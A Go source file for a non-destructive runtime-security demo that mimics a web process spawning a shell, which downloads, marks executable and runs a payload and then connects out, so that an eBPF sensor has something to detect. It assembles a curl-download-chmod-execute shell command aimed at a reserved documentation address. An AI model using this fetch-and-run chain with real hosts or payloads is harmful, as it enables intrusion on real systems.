// Command demo-payload is a non-destructive runtime-security signal generator.
//
// The same binary is copied to the names "java" and "curl" by the E2E script.
// Its basename selects a fixed behavior so the eBPF sensor observes a classic
// web-process -> shell -> downloader -> temp executable -> network chain.
// It never loads exploit code, changes privileges, scans the host, or sends
// data. The only network operation is a short connection attempt to the
// documentation-only TEST-NET-3 address 203.0.113.77.
package main

import (
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	demoDir         = "/tmp/agent-sec-demo"
	demoPayloadPath = demoDir + "/payload"
	demoMarkerPath  = demoDir + "/.agent-sec-safe-demo"
	demoMarker      = "agent-sec-safe-demo-v1\n"
	demoURL         = "https://203.0.113.77/agent-sec-demo"
	demoAddress     = "203.0.113.77:443"
)

func main() {
	name := filepath.Base(os.Args[0])
	var err error
	switch name {
	case "java":
		err = runWebProcess()
	case "curl":
		err = runDownloader()
	case "payload":
		err = runPayload()
	default:
		err = fmt.Errorf("run through the E2E script; unexpected executable name %q", name)
	}
	if err != nil {
		fmt.Fprintln(os.Stderr, "agent-sec safe demo:", err)
		os.Exit(1)
	}
}

func requireConsent() error {
	if os.Getenv("AGENT_SEC_DEMO") != "1" {
		return errors.New("refusing to run without AGENT_SEC_DEMO=1")
	}
	return nil
}

func runWebProcess() error {
	if err := requireConsent(); err != nil {
		return err
	}
	if len(os.Args) != 2 || os.Args[1] != "--run-safe-demo" {
		return errors.New("expected --run-safe-demo")
	}
	if err := prepareDemoDirectory(); err != nil {
		return err
	}
	executable, err := os.Executable()
	if err != nil {
		return err
	}
	downloader := filepath.Join(filepath.Dir(executable), "curl")
	if info, err := os.Stat(downloader); err != nil || !info.Mode().IsRegular() {
		return fmt.Errorf("demo downloader is missing: %s", downloader)
	}
	command := strings.Join([]string{
		shellQuote(downloader), shellQuote(demoURL), "-o", shellQuote(demoPayloadPath),
		"&&", "/bin/chmod", "0755", shellQuote(demoPayloadPath),
		"&&", shellQuote(demoPayloadPath),
	}, " ")
	fmt.Println("[demo] starting fixed, non-destructive runtime signal chain")
	child := exec.Command("/bin/sh", "-c", command)
	child.Env = append(os.Environ(), "AGENT_SEC_DEMO=1")
	child.Stdout = os.Stdout
	child.Stderr = os.Stderr
	return child.Run()
}

func prepareDemoDirectory() error {
	if info, err := os.Lstat(demoDir); err == nil {
		if info.Mode()&os.ModeSymlink != 0 || !info.IsDir() {
			return fmt.Errorf("%s must be a real directory", demoDir)
		}
		marker, markerErr := os.ReadFile(demoMarkerPath)
		if markerErr != nil || string(marker) != demoMarker {
			return fmt.Errorf("refusing to reuse unmarked directory %s", demoDir)
		}
	} else if !os.IsNotExist(err) {
		return err
	} else if err := os.Mkdir(demoDir, 0o700); err != nil {
		return err
	} else if err := os.WriteFile(demoMarkerPath, []byte(demoMarker), 0o600); err != nil {
		return err
	}
	if info, err := os.Lstat(demoPayloadPath); err == nil {
		if !info.Mode().IsRegular() {
			return fmt.Errorf("refusing to replace non-regular path %s", demoPayloadPath)
		}
		if err := os.Remove(demoPayloadPath); err != nil {
			return err
		}
	} else if !os.IsNotExist(err) {
		return err
	}
	return nil
}

func runDownloader() error {
	if err := requireConsent(); err != nil {
		return err
	}
	if len(os.Args) != 4 || os.Args[1] != demoURL || os.Args[2] != "-o" || os.Args[3] != demoPayloadPath {
		return errors.New("arguments differ from the fixed safe demo contract")
	}
	source, err := os.Open("/proc/self/exe")
	if err != nil {
		return err
	}
	defer source.Close()
	destination, err := os.OpenFile(demoPayloadPath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	if _, err := io.Copy(destination, source); err != nil {
		destination.Close()
		return err
	}
	if err := destination.Sync(); err != nil {
		destination.Close()
		return err
	}
	if err := destination.Close(); err != nil {
		return err
	}
	fmt.Println("[demo] wrote harmless executable fixture to", demoPayloadPath)
	return nil
}

func runPayload() error {
	if err := requireConsent(); err != nil {
		return err
	}
	dialer := net.Dialer{Timeout: 250 * time.Millisecond}
	connection, err := dialer.Dial("tcp", demoAddress)
	if err == nil {
		_ = connection.Close()
	}
	// Failure is expected: TEST-NET-3 is reserved for documentation. The
	// connect syscall attempt is the signal under test and no data is sent.
	fmt.Println("[demo] generated connection-attempt signal to", demoAddress)
	return nil
}

func shellQuote(value string) string {
	return "'" + strings.ReplaceAll(value, "'", "'\"'\"'") + "'"
}
